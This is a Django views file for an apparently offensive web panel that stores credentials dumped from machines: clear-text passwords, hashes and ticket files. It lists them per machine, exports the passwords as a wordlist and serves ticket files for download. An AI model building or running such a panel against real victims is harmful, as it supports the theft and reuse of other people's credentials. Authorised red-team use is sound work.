# -*- encoding: utf-8 -*-
from __future__ import unicode_literals
from django.utils.translation import ugettext as _
from django.shortcuts import render, redirect
from django.conf import settings
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.http import HttpResponse, JsonResponse
from django.urls import reverse
from django.utils import timezone as djtz
from django.views.decorators.csrf import csrf_exempt
import os
from django.http import Http404
from src.core.utils import get_client_ip
from src.core.models import Machine,DumpedCredentials
from django.shortcuts import get_object_or_404
from src.core.utils import paginate
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate
from django.contrib.auth import login as auth_login
from django.contrib.auth import logout as logout_auth

@login_required
def index(request):
    percent = lambda part:int(float(DumpedCredentials.objects.all().count()) / 100 * float(part))
    
    last_5objects = DumpedCredentials.objects.all().order_by("created")[:5]
    clear_text_passwords = DumpedCredentials.objects.filter(type=DumpedCredentials.NORMAL)
    tickets = DumpedCredentials.objects.filter(type=DumpedCredentials.TICKET)
    all_Credentials = DumpedCredentials.objects.all()
    all_Machines = Machine.objects.all()
    ctx = {
        'last_5objects':last_5objects,
        'ticket_pre':percent(tickets.count()),
        'clear_pre':percent(clear_text_passwords.count()),
        'hash_pre':percent(DumpedCredentials.objects.filter(type=DumpedCredentials.HASH).count()),
        'all_Machines':all_Machines,
        'all_Credentials':all_Credentials,
        'tickets':tickets,
        'clear_text_passwords':clear_text_passwords,
    }
    return render(request,'index.html',ctx)

@login_required
def machines_list(request):
    all_m = Machine.objects.all()
    machines = paginate(objects=all_m, per_page=90, page=request.GET.get("page"))
    ctx = {'machines':machines,'all_m':all_m}
    return render(request,'machines_list.html',ctx)

@login_required
def machine_view(request,guid=None):
    dumpedCredentials = []
    if guid:
        machine_object = get_object_or_404(Machine,guid=guid)
        dumpedCredentials = DumpedCredentials.objects.filter(machine=machine_object)
    else:
        dumpedCredentials = DumpedCredentials.objects.filter()
    dumpedCredentialsFrommachines = paginate(objects=dumpedCredentials, per_page=10, page=request.GET.get("page"))
    return render(request,'machines_view.html',{'dumpedCredentials':dumpedCredentialsFrommachines})

@login_required
def export_password_list(request,guid=None):
    response = HttpResponse(content_type='text/plain')
    response['Content-Disposition'] = 'attachement; filename="password_list.txt"'
    if guid:
        machine_object = get_object_or_404(Machine,guid=guid)
        dumpedCredentials = DumpedCredentials.objects.filter(machine=machine_object)
    else:
        dumpedCredentials = DumpedCredentials.objects.filter(type=DumpedCredentials.NORMAL)
    for i in dumpedCredentials:
        password = str(i.password)
        if len(password):
            response.write(password+'\n')
    return response

@login_required
def download_ticket(request,guid):
    dumpedCredential = get_object_or_404(DumpedCredentials,guid=guid)
    filename = str(dumpedCredential.ticketfile)
    response = HttpResponse(content_type='application/octet-stream')
    response.write(dumpedCredential.ticketfile.read())
    response['Content-Disposition'] = 'attachement; filename="{}"'.format(filename)
    return response

def login(request):
    if request.user.is_authenticated:
        return redirect('/')
    if request.POST:
        username = request.POST.get('username',None)
        password = request.POST.get('password',None)
        if all([username,password]):
            user = authenticate(username=username, password=password)
            if user:
                auth_login(request,user)
                return redirect('/')
            else:
                messages.error(request,"wrong username or password")
        else:
            messages.error(request,"fill the inputs plz")
    return render(request,'login.html',{})

def logout(request):
    logout_auth(request)
    return redirect('/')